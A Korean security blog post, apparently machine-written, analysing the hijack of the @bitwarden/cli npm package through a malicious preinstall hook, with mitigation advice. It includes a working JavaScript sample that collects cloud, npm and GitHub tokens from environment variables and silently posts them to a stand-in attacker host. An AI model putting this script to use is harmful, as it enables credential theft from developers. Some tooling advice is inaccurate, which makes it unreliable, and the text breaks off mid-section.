---
title: "Bitwarden CLI npm 패키지 하이재킹: 개발자 인증정보 탈취 공격"
date: 2026-04-30T01:07:26+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
draft: true
---

## 서론

개발자라면 누구나 한 번쯤 `npm install` 명령어를 무심코 실행해 본 경험이 있을 것입니다. 믿을 수 있는 공식 레지스트리에서, 유명한 오픈소스 프로젝트의 패키지를 내려받는 과정은 이제 일상적인 개발 워크플로우의 일부가 되었습니다. 하지만 만약 그 패키지가 개발자의 가장 민감한 인증정보를 탈취하기 위해 설계된 정교한 함정이었다면 어떨까요?

최근 JFrog 보안 연구팀이 발견한 `@bitwarden/cli` v2026.4.0 버전의 하이재킹 사건은 이러한 악몽이 현실이 될 수 있음을 보여줍니다. 비트워든(Bitwarden)은 수백만 명이 사용하는 유명한 비밀번호 관리자이며, 그 CLI(Command Line Interface) 도구는 개발자들이 CI/CD 파이프라인이나 자동화 스크립트에서 자격 증명을 안전하게 관리하는 데 필수적으로 사용합니다.

이번 공격의 핵심은 패키지의 이름과 브랜딩을 위장한 채, 설치 과정(`preinstall` 스크립트)과 실행 파일 자체(`bw` 바이너리)를 교묘하게 조작했다는 점입니다. 공격자는 개발자가 패키지를 설치하는 순간 발생하는 권한을 악용하여, 시스템 환경변수에 숨겨진 API 키, AWS 토큰, 데이터베이스 credential 등을 탈취하는 악성 로더를 삽입했습니다. 이는 단순한 라이브러리 취약점을 넘어선, **Supply Chain Attack(공급망 공격)**의 정점이라 할 수 있습니다. 왜 우리가 익숙한 `npm install` 한 줄이 보안의 최전선이 되어야 하는지, 그 기술적 배경과 대응 전략을 깊이 있게 분석해 보겠습니다.

*(⚠️ **윤리적 경고**: 본 문서에 포함된 코드 및 기술적 분석은 보안 연구 및 방어 목적입니다. 악의적인 목적으로 사용하는 것은 엄격히 금지되며 법적 책임을 질 수 있습니다.)*

## 공격 메커니즘 분석

### 1. 공격 시나리오 및 흐름도

이번 공격은 개발자가 악성 버전의 패키지를 설치하는 순간부터 시작됩니다. 공격자는 `package.json`의 라이프사이클 스크립트 중 하나인 `preinstall`을 악용했습니다. npm은 패키지를 설치하기 전에 `preinstall` 스크립트를 먼저 실행하는 특성이 있습니다. 공격자는 이 순간을 노려 악성 JavaScript 파일(`bw_setup.js`)을 실행시켰습니다.

아래 다이어그램은 이 공격이 어떻게 체인으로 연결되어 개발자의 정보를 탈취하는지 보여줍니다.

```javascript
graph TD
    A[Developer] -->|npm install @bitwarden/cli| B[npm Registry]
    B -->|Download v2026.4.0| C[Local Environment]
    C --> D[Read package.json]
    D -->|Detect preinstall script| E[Execute node bw_setup.js]
    E --> F[Collect Environment Variables]
    F -->|AWS Keys, Tokens, etc.| G[Exfiltrate to Attacker C2]
    E --> H[Replace/Modify bw binary]
    H --> I[Persistence & Execution]
    I --> J[Installation Completes]
```

### 2. 기술적 심층 분석: `preinstall` 스크립트와 악성 로더

정상적인 npm 패키지라면 의존성을 설치하고 빌드하는 과정만 거쳐야 합니다. 하지만 해커들은 `package.json` 파일에 악의적인 명령어를 삽입했습니다.

**악성 package.json 예시 (분석용 재구성)**

```json
{
  "name": "@bitwarden/cli",
  "version": "2026.4.0",
  "description": "Bitwarden CLI",
  "scripts": {
    "preinstall": "node bw_setup.js"
  },
  "bin": {
    "bw": "./bin/bw"
  }
}
```

위 코드에서 `preinstall` 스크립트는 패키지가 설치되기 **전**에 `node bw_setup.js`를 실행합니다. 이때 `bw_setup.js`는 시스템의 환경변수(`process.env`)를 스캔하여 AWS_ACCESS_KEY_ID, NPM_TOKEN, GitHub_TOKEN 등의 민감한 정보를 수집하고, 이를 외부 C2(Command & Control) 서버로 전송합니다.

**PoC (Proof of Concept) - 개념 증명 코드** *참고: 실제 악성 코드는 난독화되어 있으나, 여기서는 그 작동 원리를 이해하기 위해 학습 목적으로 단순화했습니다.*

```javascript
// pw_setup.js (Educational PoC)
const https = require('https');

function exfiltrateData(data) {
    const postData = JSON.stringify(data);

    const options = {
        hostname: 'attacker-controlled-server.com',
        port: 443,
        path: '/api/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, (res) => {
        // Silent failure to avoid detection
    });

    req.on('error', (e) => {
        // Ignore errors
    });

    req.write(postData);
    req.end();
}

// Scanning for sensitive environment variables
const sensitiveKeys = [
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'NPM_TOKEN',
    'GITHUB_TOKEN',
    'DATABASE_URL'
];

const stolenData = {};

sensitiveKeys.forEach(key => {
    if (process.env[key]) {
        stolenData[key] = process.env[key];
    }
});

if (Object.keys(stolenData).length > 0) {
    exfiltrateData(stolenData);
}
```

이 코드는 개념적 예시이지만, 실제 공격에서는 OS 정보, 내부 IP, 그리고 더 광범위한 환경변수를 수집하여 Base64 등으로 인코딩해 은밀하게 전송했습니다.

### 3. 정상 패키지 vs. 하이재킹된 패키지 비교

공격자의 기술이 얼마나 교묘한지는 아래 표를 통해 명확히 알 수 있습니다. 공격자는 패키지의 전반적인 구조를 유지하여 개발자가 의심하지 않게 만들었습니다.

| 비교 항목 | 정상 Bitwarden CLI 패키지 | 하이재킹된 패키지 (v2026.4.0) |
| :--- | :--- | :--- |
| **패키지 메타데이터** | 공식 Bitwarden 팀 소유, 서명됨 | 위조 또는 탈취된 계정으로 게시, 외관상 동일 |
| **preinstall 스크립트** | 존재하지 않거나 빌드 도구 설정만 존재 | 악성 `bw_setup.js` 실행 명령어 포함 |
| **바이너리 (bw)** | 정상적인 컴파일된 바이너리 | 악성 코드가 인젝션되었거나 교체된 바이너리 |
| **설치 시 동작** | 의존성 다운로드 및 바이너리 배치 | **환경변수 탈취 및 C2 서버로 전송** |
| **탐지 난이도** | 낮음 (정상 소프트웨어) | 높음 (정상 설치 과정으로 위장함) |

## 방어 및 완화 조치 (Mitigation Strategies)

이러한 Supply Chain Attack은 개발자 개인의 노력만으로는 막기 어렵지만, 시스템 레벨과 프로세스 레벨에서 다층적인 방어선을 구축할 수 있습니다.

### Step-by-Step 가이드: npm 환경 보안 강화

**1. Lockfile 및 무결성 검사 강화**

`package-lock.json`은 패키지의 정확한 버전과 해시(Integrity) 정보를 담고 있습니다. 이 파일을 버전 관리 시스템(Git)에 반드시 포함시키고, 설치 시 무결성을 검증하도록 설정해야 합니다.

```bash
# CI/CD 환경에서 lockfile을 통한 안전한 설치 강제
npm ci
```

`npm install` 대신 `npm ci`를 사용하면 `package-lock.json`에 기록된 정확한 버전과 해시값을 기준으로만 설치를 진행하므로, 의도치 않은 패키지 업데이트나 변조를 방지할 수 있습니다.

**2. 패키지 라이선스 및 스크립트 감사**

설치하려는 패키지에 포함된 스크립트를 사전에 검토해야 합니다. `npm audit`을 주기적으로 실행하는 것은 기본입니다.

```bash
# 취약점 스캔
npm audit

# 패키지 내부 파일 및 스크립트 미리보기 (도구 예시)
npm install -g npm-check-updates
npx npm-force-resolutions
```

더 나아가 `.npmrc` 설정 파일을 통해 프로젝트 레벨에서 `preinstall` 스크립트 실행을 차단하는 것도 방법입니다.

```plain text
# .npmrc
ignore-scripts=true
```

위 설정을 사용하면 모든 라이프사이클 스크립트(preinstall, install, postinstall 등)의 실행을 막을 수 있지만, 정상적인 패키지의 빌드 과정이 중단될 수 있으므로 테스트가 필요합니다.

**3. 개발 환경 격리 (Sandboxing)**

개발

---

**출처**: [https://news.hada.io/topic?id=28819](https://news.hada.io/topic?id=28819)